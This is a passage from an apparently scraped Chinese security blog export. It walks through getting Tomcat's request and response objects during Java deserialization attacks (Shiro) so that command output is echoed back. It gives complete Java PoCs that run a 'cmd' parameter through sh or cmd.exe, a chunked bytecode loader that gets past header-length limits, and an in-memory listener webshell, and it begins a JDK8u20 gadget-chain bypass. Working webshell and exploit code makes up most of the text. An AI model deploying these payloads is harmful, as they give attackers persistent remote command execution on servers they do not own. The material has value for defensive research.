lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); ThreadLocal\u0026lt;ServletRequest\u0026gt; lastServicedRequest = (ThreadLocal\u0026lt;ServletRequest\u0026gt;) lastServicedRequestField.get(null); ThreadLocal\u0026lt;ServletResponse\u0026gt; lastServicedResponse = (ThreadLocal\u0026lt;ServletResponse\u0026gt;) lastServicedResponseField.get(null); ServletRequest request = lastServicedRequest.get(); ServletResponse response = lastServicedResponse.get(); String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if( cmd != null) { String line; String[] cmds = new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; PrintWriter out = response.getWriter(); Process execResult = Runtime.getRuntime().exec(cmds); InputStream inputStream = execResult.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); while((line = bufferedReader.readLine()) != null){ out.println(line); } } }catch (Exception e){ } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 最后分两次打入 TomcatEchoThreadLocal1 和 TomcatEchoThreadLocal2，即可回显执行结果\n1.1.3 完整POC 当然，我们也可以将 TomcatEchoThreadLocal1 、TomcatEchoThreadLocal2 整合到一起，构造TomcatEchoThreadLocal\n这里参考 kingkk师傅 的代码修复报错输出（虽然我没遇到过）\npublic class TomcatEchoThreadLocal extends AbstractTranslet{ static { try{ Class\u0026lt;?\u0026gt; applicationDispatcherClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationDispatcher\u0026#34;); Field WRAP_SAME_OBJECT_FIELD = applicationDispatcherClass.getDeclaredField(\u0026#34;WRAP_SAME_OBJECT\u0026#34;); Field modifiersField = WRAP_SAME_OBJECT_FIELD.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); WRAP_SAME_OBJECT_FIELD.setAccessible(true); modifiersField.setAccessible(true); modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() \u0026amp; ~Modifier.FINAL); // final标志位 置0 Class\u0026lt;?\u0026gt; applicationFilterChainClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); Field lastServicedRequestField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); Field lastServicedResponseField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedResponse\u0026#34;); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() \u0026amp; ~Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() \u0026amp; ~Modifier.FINAL); ThreadLocal\u0026lt;ServletRequest\u0026gt; lastServicedRequest = (ThreadLocal\u0026lt;ServletRequest\u0026gt;) lastServicedRequestField.get(null); ThreadLocal\u0026lt;ServletResponse\u0026gt; lastServicedResponse = (ThreadLocal\u0026lt;ServletResponse\u0026gt;) lastServicedResponseField.get(null); boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null); if (!WRAP_SAME_OBJECT || lastServicedRequest == null || lastServicedResponse == null) { WRAP_SAME_OBJECT_FIELD.set(null, true); lastServicedRequestField.set(null, new ThreadLocal\u0026lt;ServletRequest\u0026gt;()); lastServicedResponseField.set(null, new ThreadLocal\u0026lt;ServletResponse\u0026gt;()); }else { // 没修改过 WRAP_SAME_OBJECT 就没必要执行命令了 ServletRequest requestFacade = lastServicedRequest.get(); ServletResponse responseFacade = lastServicedResponse.get(); String cmd = requestFacade != null ? requestFacade.getParameter(\u0026#34;cmd\u0026#34;) : null; if (cmd != null) { PrintWriter out = responseFacade.getWriter(); Field responseField = ResponseFacade.class.getDeclaredField(\u0026#34;response\u0026#34;); responseField.setAccessible(true); Response response = (Response) responseField.get(responseFacade); Field usingWriterField = Response.class.getDeclaredField(\u0026#34;usingWriter\u0026#34;); usingWriterField.setAccessible(true); usingWriterField.set(response, Boolean.FALSE); // 如果在一次请求中 usingWriter 变为了 true 那么在这次请求之后的结果输出时就会报错 boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = scanner.hasNext() ? scanner.next() : \u0026#34;\u0026#34;; out.write(output); out.flush(); } } }catch (Exception e){ } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 1.1.4 缺陷分析 lastServiceRequest 和 lastServiceRequest 是在 filter.doFilter 后赋值的，这意味直到所有的 filter 完成拦截后，request 和 response 才能被保存下来。\n如果漏洞的反序列化入口位于 filter ，我们再尝试反序列化上面的 POC ，此时的 lastServiceRequest 和 lastServiceRequest 尚未保存 request 和 response， POC 将无法预期执行。一个典型的例子就是 Shiro，它的 rememberMe 功能就是利用 shiroFilter 实现的，所以我们没法通过这种方式获取到 Shiro 的 Request和Response对象来进行回显。\n1.2 通过currentThreadContext获取request (Tomcat \u0026gt;= 8) Litch 师傅 在这之后又提出了一个全新的思路：寻找 Tomcat 全局存储的 request 或 response\n1.2.1 流程分析 下个断点对 Tomcat 进行调试\n翻看相关调用栈，寻找 request 和 response 第一次出现的地方，一眼看到 Http11Processor，毕竟 Processor 的职责就是将 Socket 请求封装成 Reuqest 请求。\nHttp11Processor#service\n可以发现这里的 request 与 response 是以成员变量的形式出现的，这意味着只要我们找到了当前请求对应的 Http11Processor 对象，就能获取内部的 request 、 response 对象。\n因此继续沿着调用栈，寻找何处存储了 processor 或 processor 的 request 属性\nAbstractProtocol$ConnectionHandler#process\n可以发现 process 方法会先从 connections 表中获取 processor。在获取不到 processor 时，则会调用 getProtocol().createProcessor()方法创建新的 processor 对象，再调用 register 方法\nAbstractProtocol$ConnectionHandler#register\n深入 reqister 方法内部，注意这两行代码\nRequestInfo rp = processor.getRequest().getRequestProcessor(); rp.setGlobalProcessor(global); global 属性是一个 RequestGroupInfo 对象\n我们发现这里直接调用 processor.getRequest 方法获取了 process 的 request 属性，并根据 request 生成对应的 RequestInfo 对象。而后又通过 setGlobalProcessor 方法，将 RequestInfo 添加到 RequestGroupInfo 中\nRequestInfo#setGlobalProcessor\n因此，AbstractProtocol$ConnectionHandler 的 global 属性实际上存储了 Http11Processor 对象的 request属性（其实按理来说从 connections 表应该也能获取 request 吧）\n既然AbstractProtocol$ConnectionHandler 是 AbstractProtocol 的内部类，那么AbstractProtocol 自然有其对应的 handler 属性，接下来只需要寻找何处存储了 AbstractProtocol 对象即可。\n可以借助这张图来简单的了解 Tomcat 架构中的 Connector 设计（图片来自这篇文章)\nConnector\n因此我们可以通过 Connector 来获取 AbstractProtocol 对象（实现了 protocolHandler 接口），继续搜索存储了 Connector 的类\nTomcat#getConnector\n在 Tomcat#getConnector 方法中发现 connector 可以被 service 存储，而 service 对应的类型是 StandardService\n分析到这里，梳理一下获取 request 的流程。\nStandardService -\u0026gt; connector -\u0026gt; AbstractProtocol -\u0026gt; AbstractProtocol$ConnectionHandler -\u0026gt; RequestGroupInfo -\u0026gt; RequestInfo -\u0026gt; request -\u0026gt; response 接下来的问题是如何获取 StandardService 对象。\nLitch 师傅给出的办法是先利用 Thread.currentThread().getContextClassLoader() 获取当前线程的加载器 WebappClassLoaderBase，然后通过WebappClassLoaderBase 拿到 StandardService 对象。\n我这里获取到的是 ParallelWebappClassLoader（因为默认情况下使用 ParallelWebappClassLoader作为类加载器，而不是 WebappClassLoader），可以看到包含了 StandardContext 、StandardService 等信息\n梳理一下获取 request 、response 的整体流程\nWebappClassLoaderBase -\u0026gt; StandardContext -\u0026gt; StandardService -\u0026gt; connector -\u0026gt; AbstractProtocol -\u0026gt; AbstractProtocol$ConnectionHandler -\u0026gt; RequestGroupInfo -\u0026gt; RequestInfo -\u0026gt; request -\u0026gt; response 1.2.2 编写POC TomcatEchoThreadContext\npublic class TomcatEchoThreadContext extends AbstractTranslet { static { try { WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) classLoader.getResources().getContext(); Field ApplicationcontextField = StandardContext.class.getDeclaredField(\u0026#34;context\u0026#34;); ApplicationcontextField.setAccessible(true); ApplicationContext context = (ApplicationContext) ApplicationcontextField.get(standardContext); Field serviceField = ApplicationContext.class.getDeclaredField(\u0026#34;service\u0026#34;); serviceField.setAccessible(true); StandardService service = (StandardService) serviceField.get(context); // 获取 StandardService Connector[] connectors = service.findConnectors(); for (Connector connector: connectors){ if (connector.getScheme().length() == 4){ // 筛选出 scheme 属性为 \u0026#34;http\u0026#34; 的 connector ProtocolHandler protocolHandler = connector.getProtocolHandler(); // 获取 protocolHandler if(protocolHandler instanceof AbstractHttp11Protocol){ // 筛选出负责处理 http 请求的 AbstractHttp11Protocol Class\u0026lt;?\u0026gt;[] innerClasses = AbstractProtocol.class.getDeclaredClasses(); // 获取 AbstractProtocol 的内部类 for (Class\u0026lt;?\u0026gt; innerClass: innerClasses){ if((innerClass.getName().length() == 52) || (innerClass.getName().length() == 60)){ // 筛选出 org.apache.coyote.AbstractProtocol$ConnectionHandler Method getHandlerMethod = AbstractProtocol.class.getDeclaredMethod(\u0026#34;getHandler\u0026#34;); getHandlerMethod.setAccessible(true); Object handler = getHandlerMethod.invoke(protocolHandler, null); // 获取 AbstractProtocol$ConnectionHandler 对象 Field globalField = innerClass.getDeclaredField(\u0026#34;global\u0026#34;); globalField.setAccessible(true); RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler); // 获取 global Field processorsField = RequestGroupInfo.class.getDeclaredField(\u0026#34;processors\u0026#34;); processorsField.setAccessible(true); ArrayList\u0026lt;RequestInfo\u0026gt; requestInfoList = (ArrayList\u0026lt;RequestInfo\u0026gt;) processorsField.get(global); // 获取 global 内部的 processors 属性, 这里命名为 requestInfoList Field reqField = RequestInfo.class.getDeclaredField(\u0026#34;req\u0026#34;); reqField.setAccessible(true); for (RequestInfo requestInfo: requestInfoList){ org.apache.coyote.Request coyoteRequest = (Request) reqField.get(requestInfo); // 注意这里的 request 为 org.apache.coyote.Request // 而我们要用的request 为 org.apache.catalina.connector.Request, 存储在 notes 属性中 org.apache.coyote.Response coyoteResponse = coyoteRequest.getResponse(); // response 同理 org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) coyoteRequest.getNote(1); org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response) coyoteResponse.getNote(1); String cmd = request != null ? request.getParameter(\u0026#34;cmd\u0026#34;) : null; if (cmd != null) { PrintWriter out = response.getWriter(); Field usingWriterField = org.apache.catalina.connector.Response.class.getDeclaredField(\u0026#34;usingWriter\u0026#34;); usingWriterField.setAccessible(true); usingWriterField.set(response, Boolean.FALSE); // 如果在一次请求中 usingWriter 变为了 true 那么在这次请求之后的结果输出时就会报错 boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = scanner.hasNext() ? scanner.next() : \u0026#34;\u0026#34;; out.write(output); out.flush(); } } } } } } } }catch (Exception e){} } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 编写过程就不再赘述，都写在注释里了\n1.2.3 绕过 Tomcat header 长度限制 由于 POC 的利用链较长，在打 Shiro 的时候很容易因为过长的 header导致 Tomcat无法处理请求，报 400 bad request 错误。\nLitch1 师傅给出的办法是通过改变 Tomcat max header 的大小来解除 header 长度限制，修改的具体对象是org.apache.coyote.http11.AbstractHttp11Protocol 类的 maxHeaderSize 属性。\n思路是改变org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这个值会影响新的Request的inputBuffer时的对于header的限制，但是由于request的inputbuffer会复用，所以我们在修改完maxHeaderSize之后，需要多个连接同时访问，让tomcat新建request的inputbuffer，这时候的buffer的大小限制就会使用我们修改过后的值。\n不过该方法需要用多个线程访问，以确保 request 的 inputbuffer 属性被成功修改。个人感觉利用起来的话有点麻烦，而且也不太稳定，所以就没复现（其实单纯就是偷懒罢了哈哈哈）\n后来在 F4DE 师傅的文章中看到这样一种方法：通过动态类加载解决 Tomcat Header 长度限制。非常好理解，其实就是获取过长 WebShell 的字节码，让另外一个加载类去加载 WebShell 字节码，达到分离 Payload 的目的（加载类 + WebShell 字节码），Shiro 只需要反序列化加载类，即可间接加载 WebShell。\nWebShell 字节码肯定不能硬编码到加载类中，要从其他途径获取，如果机器出网，自然可以用 URLClassLoader 的方式远程加载，但如果不出网，就必须寻找一处能够全局存储 WebShell 字节码的地方。\nF4DE 师傅的解决方法是获取 request 对象存储 WebShell 字节码（Spring 环境下）\nServletRequestAttributes attributes= (ServletRequestAttributes) RequestContextHolder.getRequestAttributes(); if (attributes != null){ HttpServletRequest requestFacade = attributes.getRequest(); Field requestField = requestFacade.getClass().getDeclaredField(\u0026#34;request\u0026#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); } 这样我们就可以把字节码放到请求 Body 中，让加载类从 request 对象中获取 WebShell 字节码。当然如果不是 Spring 环境，该方法就失效了，所以我们最好能寻得一处能够全局存储 WebShell 字节码的媒介。\nY4tracker 师傅在《 浅谈Shiro550受Tomcat Header长度限制影响突破 》一文中提出用当前线程的 name 属性来存储 WebShell。\n受此启发，我也尝试在 Tomcat 中寻找类似的对象\nimport java from Class c, Field f where f.isStatic() and f.getType().getName() = \u0026#34;String\u0026#34; and f.getDeclaringType() = c and not exists (c.getEnclosingType()) select c.getQualifiedName(), f 满足条件的类有很多，选择 PlatformXmlPropertiesProvider\nPlatformXmlPropertiesProvider 是 JDK 标准库下的类，其中的 PROPS_DTD_URI、PROPS_DTD、EXTERNAL_XML_VERSION 都是String 类型的静态属性，很容易存储 WebShell 字节码并被获取。（ 不过JDK11 把PlatformXmlPropertiesProvider删了，悲）\n这里选用 EXTERNAL_XML_VERSION 存储 WebShell 字节码，接下来开始编写POC\nBreakTomcatHeaderLengthLimit1\npublic class BreakTomcatHeaderLengthLimit1 extends AbstractTranslet { // BreateTomcatHeaderLengthLimit1 用于分批注入 WebShell 字节码 static { try { String payload = \u0026#34;分割后传入的字节码\u0026#34;; Field EXTERNAL_XML_VERSION_FIELD = PlatformXmlPropertiesProvider.class.getDeclaredField(\u0026#34;EXTERNAL_XML_VERSION\u0026#34;); Field modifiersField = EXTERNAL_XML_VERSION_FIELD.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); EXTERNAL_XML_VERSION_FIELD.setAccessible(true); modifiersField.setAccessible(true); modifiersField.setInt(EXTERNAL_XML_VERSION_FIELD, EXTERNAL_XML_VERSION_FIELD.getModifiers() \u0026amp; ~Modifier.FINAL); String EXTERNAL_XML_VERSION = (String) EXTERNAL_XML_VERSION_FIELD.get(null); if (payload.equals(\u0026#34;reset\u0026#34;)){ EXTERNAL_XML_VERSION_FIELD.set(null, \u0026#34;1.0\u0026#34;); // 顺手加个 reset, 用于重置 }else { if (EXTERNAL_XML_VERSION.equals(\u0026#34;1.0\u0026#34;)) { EXTERNAL_XML_VERSION_FIELD.set(null, payload); } else { EXTERNAL_XML_VERSION_FIELD.set(null, EXTERNAL_XML_VERSION + payload); } } }catch (Exception e){} } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } BreakTomcatHeaderLengthLimit2\npublic class BreakTomcatHeaderLengthLimit2 extends AbstractTranslet { // BreateTomcatHeaderLengthLimit2 用于加载 WebShell static { try{ Field EXTERNAL_XML_VERSION_FIELD = PlatformXmlPropertiesProvider.class.getDeclaredField(\u0026#34;EXTERNAL_XML_VERSION\u0026#34;); EXTERNAL_XML_VERSION_FIELD.setAccessible(true); String EXTERNAL_XML_VERSION = (String) EXTERNAL_XML_VERSION_FIELD.get(null); BASE64Decoder base64Decoder = new BASE64Decoder(); byte[] bytecodes = deCompress(base64Decoder.decodeBuffer(EXTERNAL_XML_VERSION)); Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class evail = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), bytecodes, 0, bytecodes.length); evail.getDeclaredConstructor().newInstance(); }catch (Exception e){} } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public static byte[] deCompress(byte[] bytes){ try { GZIPInputStream gin = new GZIPInputStream(new ByteArrayInputStream(bytes)); ByteArrayOutputStream bout = new ByteArrayOutputStream(); byte[] buf = new byte[1024]; int len; while ((len = gin.read(buf)) \u0026gt; 0) { bout.write(buf, 0, len); } return bout.toByteArray(); }catch (Exception e){} return null; } } 具体流程\n获取 TomcatEchoThreadContext 字节码 -\u0026gt; 经 Base64 + GZip 压缩 -\u0026gt; 按一定长度分割 -\u0026gt; 分割后的字节码由BreakTomcatHeaderLengthLimit1 负责分批写入到 EXTERNAL_XML_VERSION -\u0026gt; BreakTomcatHeaderLengthLimit2 从 EXTERNAL_XML_VERSION 中获取字节码，GZip + Base64 解压，加载 WebShell 如果注入成功的话， EXTERNAL_XML_VERSION 应该是这样子\n最终成功执行命令\n小问题 在编写 BreakTomcatHeaderLengthLimit2 的过程中遇到了一个小问题\nMethod defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class evail = (Class) defineClassMethod.invoke(new ZClassLoader(), bytecodes, 0, bytecodes.length); evail.getDeclaredConstructor().newInstance(); // 这里用 new ZClassLoader(), 是因为同一个类加载器不能重复加载同个类, 所以每次请求都用新的类加载器加载 WebShell 字节码 static class ZClassLoader extends ClassLoader{ public ZClassLoader(){ super(); } } 一开始参考了 F4DE 师傅的思路（Spring环境），用自定义的类加载器加载 WebShell 字节码，发现在执行 TomcatEchoThreadContext 第一句代码时就抛出了异常\npublic class TomcatEchoThreadContext extends AbstractTranslet { static { try { WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); ... 细想了一下，自定义的 ZClassLoader 并不在 WEB-INF/classes 目录下， WebappClassLoaderBase 是获取不到 ZClassLoader 字节码的，所以要使用 Thread.currentThread().getContextClassLoader() 加载 TomcatEchoThreadContext。\n那么问题又回来了：同一个类加载器只能加载同个类一次，这意味着我们的 WebShell 只能执行一次。\n有什么解决办法呢？难不成每执行一次 WebShell 就改一次类名？这也太麻烦了\u0026hellip;\n答案当然是有的，threedr3m 师傅在 基于tomcat的内存 Webshell 无文件攻击技术 一文中提出了动态注册 filter 的技术，我们只需要将 TomcatEchoThreadContext 改成内存马，即可无限制 getshell 了。\n不过话又说回来，既然是内存马，就不需要写这么长的 poc 来获取 response 对象了。可以直接用 context 注册 Tomcat 组件，但这又是后话了~\nTomcatEchoThreadContext\npublic class TomcatEchoThreadContext extends AbstractTranslet implements ServletRequestListener { static { WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); Context context = classLoader.getResources().getContext(); Object[] applicationEventListeners = context.getApplicationEventListeners(); List\u0026lt;Object\u0026gt; listeners = Arrays.asList(applicationEventListeners); List\u0026lt;Object\u0026gt; arrayList = new ArrayList(listeners); arrayList.add(new TomcatInjectListener()); context.setApplicationEventListeners(arrayList.toArray()); // 将 MemoryListener 添加到 context 中 } @Override public void requestInitialized(ServletRequestEvent sre) { try { String line; RequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = Class.forName(\u0026#34;org.apache.catalina.connector.RequestFacade\u0026#34;).getDeclaredField(\u0026#34;request\u0026#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); // 获取 request Response response = request.getResponse(); // 获取 response PrintWriter out = response.getWriter(); String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if (cmd != null) { Process execResult = Runtime.getRuntime().exec(cmd); InputStream inputStream = execResult.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); while ((line = bufferedReader.readLine()) != null) { out.println(line); } } } catch (Exception e){ } } @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 注入成功的话是这样子\n1.2.4 缺陷分析 只适用 Tomat 8、9 ，其他版本的 WebappClassLoaderBase 获取不到 context 在服务请求连接较多时可能有性能问题 链子较长，会导致请求包过大 1.3 利用 java-object-searcher 工具寻找任意版本、任意中间件的 Request c0ny1 师傅在半自动化挖掘request实现多种中间件回显 这篇文章中介绍了如何在任意中间件中寻找 request 对象，并且开源了自己的内存对象搜索工具 java-object-searcher （c0ny1 师傅技术强，心又善 Orz）\n下面我借助 c0ny1 师傅的这款工具来寻找 Tomcat11 下的 request 对象\n注意：在使用 java-object-searcher 时，需要将 java-object-searcher.jar 包放在 WEB-INF/lib 目录下，否则 WebappClassLoader 将抛出 ClassNotFoundExpection （当时忘了这茬，就把jar 包随便一放，导致调试了很久，实在是不该犯这种低级错误\u0026hellip;）\n@Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\u0026#34;执行过滤操作\u0026#34;); List\u0026lt;Keyword\u0026gt; keys = new ArrayList\u0026lt;\u0026gt;(); keys.add(new Keyword.Builder().setField_type(\u0026#34;ServletRequest\u0026#34;).build()); keys.add(new Keyword.Builder().setField_type(\u0026#34;RequstGroup\u0026#34;).build()); keys.add(new Keyword.Builder().setField_type(\u0026#34;RequestInfo\u0026#34;).build()); keys.add(new Keyword.Builder().setField_type(\u0026#34;RequestGroupInfo\u0026#34;).build()); keys.add(new Keyword.Builder().setField_type(\u0026#34;Request\u0026#34;).build()); SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); searcher.setIs_debug(true); searcher.setMax_search_depth(20); searcher.setReport_save_path(\u0026#34;D:/learning/Tomcat-memoryShell2/results\u0026#34;); searcher.searchObject(); chain.doFilter(request, response); } 这里为了排查错误，才构造了Filter 来调用 java-object-searcher，实际上完全可以用 IDEA 的 Evaluate 功能计算的\n出来的结果没几个，好吧，还是 Litch 师傅的思路\n... TargetObject = {org.apache.tomcat.util.threads.TaskThread} ---\u0026gt; contextClassLoader = {org.apache.catalina.loader.ParallelWebappClassLoader} ---\u0026gt; resources = {org.apache.catalina.webresources.StandardRoot} ---\u0026gt; context = {org.apache.catalina.core.StandardContext} ---\u0026gt; context = {org.apache.catalina.core.ApplicationContext} ---\u0026gt; service = {org.apache.catalina.core.StandardService} ---\u0026gt; connectors = {class [Lorg.apache.catalina.connector.Connector;} ---\u0026gt; [0] = {org.apache.catalina.connector.Connector} ---\u0026gt; protocolHandler = {org.apache.coyote.http11.Http11NioProtocol} ---\u0026gt; handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} ---\u0026gt; global = {org.apache.coyote.RequestGroupInfo} ... 略微修改一下获取 ParallelWebappClassLoader 对象的 resources属性的流程即可\npublic class TomcatEchoThreadContext { static { try { WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); Field resourcesField = Class.forName(\u0026#34;org.apache.catalina.loader.WebappClassLoaderBase\u0026#34;).getDeclaredField(\u0026#34;resources\u0026#34;); resourcesField.setAccessible(true); StandardRoot root = (StandardRoot) resourcesField.get(classLoader); StandardContext standardContext = (StandardContext) root.getContext(); Field ApplicationcontextField = StandardContext.class.getDeclaredField(\u0026#34;context\u0026#34;); ApplicationcontextField.setAccessible(true); ApplicationContext context = (ApplicationContext) ApplicationcontextField.get(standardContext); // 省略重复的流程 ... 除了 Tomcat，例如 Jetty、WildFly、Resin、等中间件都可用类似的方法获取 request 对象\n后续: koalr 师傅利用该工具找到了一条适用于 Tomcat 6,7,8,9 版本的利用链，bitterz师傅在文章中分析了该链的思路，并经 leeezp 师傅改造，形成了适用于 Tomcat 6,7,8,9 通用的 POC，可在他们的文章中详阅~\n0x02 未完待续 l1nk3r 师傅总结了上述的方法，在《基于Tomcat无文件Webshell研究 》一文中提出通过动态注册 servlet 、filter 、Listener 等组件的方式构造内存 shell。（当然 Servlet 在3.0版本之后才支持动态注册组件。而 Tomcat 直到 7.x 才支持 Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合 Tomcat7.x 及以上）\n0x03 Reference Tomcat中一种半通用回显方法\n基于tomcat的内存 Webshell 无文件攻击技术\n基于全局储存的新思路 | Tomcat的一种通用回显方法研究\n基于Tomcat无文件Webshell研究\ntomcat不出网回显连续剧第六集\n史上最全ThreadLocal 详解\n利用反射Bug修改final数据域\nTomcat架构解析之Connector设计\n【JVM】类加载器（二）：Tomcat 打破双亲委派\n通过动态类加载解决【通过Tomcat全局存储进行回显】在Shiro中的Header过长问题\n浅谈Shiro550受Tomcat Header长度限制影响突破\n本文原载于0ZHan\u0026rsquo;s Blog，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。\n","date":"2024-03-25T23:07:44+08:00","permalink":"/p/tomcat%E5%9B%9E%E6%98%BE%E4%B9%8Bresponse%E5%9B%9E%E6%98%BEtomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E4%BC%A0/","title":"Tomcat回显之Response回显——Tomcat内存马前传"},{"content":"JDK8u20这条链子实际上是JDK7u21链子的高版本绕过，利用链都是一致的，因此我们只关注对AnnotationInvocationHandler的高版本绕过\nJDK7u21链的修复及绕过思路 为了修复JDK7u21链，高版本JDK在AnnotationInvocationHandler.readObject()方法中校验了type类型\n如果type类型为Tempaltes.class，就会抛出异常，终止程序运行\u0026hellip;\n但是由于AnnotationInvocationHandler.readObject 是先调用 s.defaultReadObject方法 ，再抛出异常的\n因此AnnotationInvocationHandler对象在抛出异常之前就被反序列化出来了，所以如果我们能够避免下面的异常终止程序运行，就能重新走JDK7u21链\ntry-catch嵌套 我们知道 try-catch 是Java处理异常的标准语句，其中catch用于捕获并处理异常\n为了避免AnnotationInvocationHandler抛出的InvaildObjectException中断程序执行，我们可以找一个catch语句，它能捕获InvaildObjectException异常且不抛出新的异常，这样就能程序继续运行下去\n例如\npublic static void main(String[] args) { try{ throw new RuntimeException(\u0026#34;error!\u0026#34;); }catch(Exception e){ System.out.println(\u0026#34;A piece of cake!\u0026#34;); } System.out.println(\u0026#34;I\u0026#39;m still Running!\u0026#34;); } BeanContextSupport.readObject\n可以看到readChildren()会尝试反序列化ois流，如果捕获了IOException就调用continue跳过（InvalidObjectException继承自IOException），所以只要能让 BeanContextSupport 反序列化 AnnotationInvocationHandler，就能绕过异常的影响\n那么问题来了，AnnotationInvocationHandler应该在放在BeanContextSupport的那个地方呢？\n找他的位置很简单，与readChildren相对的就是writeChildren方法\n可以看到这里往输出流中写入了children的key，由于chidlren是一个HashMap，因此直接找调用children.put的方法即可\n于是找到了add方法\n可以用add方法来向BeanContextSupport写入AnnotationInvocationHandler\nBeanContextSupport beanContextSupport = new BeanContextSupport(); beanContextSupport.add(annotationHandlerInvocationHandler); 通过观察BeanContextSupport序列化的结构，我们会发现其实AnnotationInvocationHandler就在objectAnnotation数据块内，属于额外写入的数据\n因此我们只要向BeanContextSupport的objectAnnotation区域写入AnnotationInvocationHandler，就可以绕过AnnotationInvocationHandler反序列化的限制\n不过 BeanContextSupport 并不能直接写入到 JDK7u21链中，所以接下来我们考虑如何将 BeanContextSupport 拼接到 JDK7u21链中\n我这里是采用了pwntester师傅的思路（比较好理解），利用成员抛弃机制，将BeanContextSupport作为成员变量写入到Proxy中\n成员抛弃机制 Java在反序列化对象时，如果遇到了不存在的虚构成员，会正常将其反序列化并分配Handle（虚构成员是对象的情况下），但是当该对象被反序列化完成时，虚构成员会被抛弃\n具体细节\nObjectInputStream.readObject0\nObjectInputStream.readOrdinaryObject\nObjectInputStream.readClassDesc\nObjectInputStream.readNonProxyDesc\nObjectStreamClass.initNonProxy\nObjectStreamClass.lookup\nObjectStreamClass\nObjectStreamClass.getReflector\nFieldReflector\nfields 即上面 matchFileds() 方法获得的真实成员变量\n可以看到虚构成员变量对应writeKeys的值为-1\n在后续的ObjectStreamClass.setFiledValues()方法中，writeKeys[i] == 